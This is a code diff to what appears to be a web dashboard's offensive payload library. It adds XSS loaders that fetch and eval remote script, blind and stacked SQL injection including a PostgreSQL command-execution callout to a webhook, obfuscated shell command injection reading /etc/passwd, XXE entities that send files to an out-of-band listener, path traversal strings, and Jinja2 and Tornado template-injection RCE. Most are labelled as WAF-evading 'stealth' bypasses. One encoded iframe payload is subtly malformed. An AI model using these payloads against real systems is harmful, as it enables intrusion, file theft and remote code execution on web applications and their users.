@@ -519,9 +519,37 @@ export default function DashboardPage({ params }) {
           era: '2026 Stealth' 
         },
         { 
+          title: 'Fetch External JavaScript Eval Bypass', 
+          code: `fetch('${xssPayloadUrl}').then(r=>r.text()).then(t=>top['ev'+'al'](t))`, 
+          desc: 'Using fetch API instead of standard script tags. Completely evades script filters by pulling and evaluating code inside window scope.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Iframe Source Document script execution', 
+          code: `<iframe srcdoc="&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x69;&#x6D;&#x70;&#x6F;&#x72;&#x74;&#x28;&#x27;${xssPayloadUrl}&#x27;&#x29;&#x3C;&#x2F;&#x33;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"></iframe>`, 
+          desc: 'An iframe with html-entity encoded source document script element. Completely unreadable to WAF regex filters.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
           title: 'HTML5 Image Tag Error Fallback', 
           code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 
           desc: 'Standard HTML5 event bypass. Uses ES6 import to load external script.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Anchor Tag javascript URI pseudo-protocol', 
+          code: `<a href="javascript:import('${xssPayloadUrl}')">Click for reward</a>`, 
+          desc: 'Requires user interaction. Useful for stored social engineering / link injection attacks in markdown comments.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Input Element autofocus handler', 
+          code: `<input autofocus onfocus="import('${xssPayloadUrl}')">`, 
+          desc: 'Bypasses filters blocking onload/onerror handlers by exploiting auto-focusing elements.',
           priority: 'MEDIUM', 
           era: 'Standard Bypass' 
         },
@@ -560,9 +588,30 @@ export default function DashboardPage({ params }) {
           era: 'WAF Bypass' 
         },
         { 
+          title: 'Heavy Query Time-Based Exfiltration (MySQL)', 
+          code: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))x)--`, 
+          desc: 'Time-delay based validation. Perfect for checking blind SQL injection points without utilizing noisy syntax strings.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'PostgreSQL Time-Based Stacked Query', 
+          code: `';COPY (SELECT '') TO PROGRAM 'curl ${webhookUrl}/pg_rce'--`, 
+          desc: 'Requires database admin superuser privileges. Performs an out-of-band RCE using postgres dynamic command shell execution.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
           title: 'Hexadecimal String Injection', 
           code: `0x61646d696e`, 
           desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hexadecimal literals.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Database Version String Concatenation', 
+          code: `' UNION SELECT NULL,@@version,NULL,NULL--`, 
+          desc: 'Retrieves server engine distribution context. Relies on standard UNION extraction vectors.',
           priority: 'MEDIUM', 
           era: 'Standard Bypass' 
         },
@@ -608,9 +657,23 @@ export default function DashboardPage({ params }) {
           era: '2026 Stealth' 
         },
         { 
+          title: 'Hex-Encoded Command Pipeline Execution', 
+          code: `$(echo -e "\\x63\\x61\\x74") $IFS /etc/passwd`, 
+          desc: 'Converts target command binary names into hexadecimal bytes, evaluating them on the fly at shell execution.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
           title: 'Base64 Decoded Pipeline', 
           code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, 
           desc: 'Decodes a base64 string on the fly and pipes it to bash, keeping keywords completely hidden from firewalls.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Backtick subshell command substitution', 
+          code: `\`id\``, 
+          desc: 'Executes nested target parameters inside modern shell configurations.',
           priority: 'MEDIUM', 
           era: 'Standard Bypass' 
         },
@@ -649,6 +712,20 @@ export default function DashboardPage({ params }) {
           era: 'WAF Bypass' 
         },
         { 
+          title: 'XML Entity Parameter Dynamic Exfiltration', 
+          code: `<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`, 
+          desc: 'Uses PHP filter streams to base64-encode sensitive local system files before passing them outwards to OOB endpoint, preventing parser errors.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Standard External General Entity Resource', 
+          code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${webhookUrl}">]><foo>&xxe;</foo>`, 
+          desc: 'Pings back OOB listener URL instantly when XML document gets evaluated on server endpoint.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
           title: 'Classic Local File Traversal (Zaman Batu)', 
           code: `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>`, 
           desc: 'Standard local file reading. Easily blocked by any basic rule inspecting external system keywords.',
@@ -676,9 +753,23 @@ export default function DashboardPage({ params }) {
           era: 'WAF Bypass' 
         },
         { 
+          title: 'PHP Bzip2 Decompression Wrapper', 
+          code: `compress.bzip2://../../etc/passwd`, 
+          desc: 'Using alternative file compression wrappers instead of file:// protocols to access operating system files.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
           title: 'Double URL Encoded Traversal', 
           code: `%252e%252e%252f%252e%252e%252fetc/passwd`, 
           desc: 'Evades WAFs that decode URLs only once. Standard double percent escapes.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Null Byte Traversal (PHP < 5.3.4)', 
+          code: `../../../../../../etc/passwd%00`, 
+          desc: 'Utilizes a null byte escape to strip system file extensions. Useful for older legacy systems.',
           priority: 'MEDIUM', 
           era: 'Standard Bypass' 
         },
@@ -708,6 +799,20 @@ export default function DashboardPage({ params }) {
           desc: 'Combines dynamic attribute getters with string splits to access restricted sandbox scopes.',
           priority: 'HIGH', 
           era: 'WAF Bypass' 
+        },
+        { 
+          title: 'Jinja2 Query Parameter String execution (No Quotes)', 
+          code: `{{request|attr(request.args.c)}}&c=__class__`, 
+          desc: 'Leverages other HTTP query arguments to fetch and resolve reserved words dynamically, avoiding quotes inside injection fields.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Tornado Template Application RCE', 
+          code: `{{import os;os.system('id')}}`, 
+          desc: 'Direct import capabilities inside vulnerable Python Tornado web servers.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
         },
         { 
           title: 'Basic Curly Expression (Zaman Batu)', 
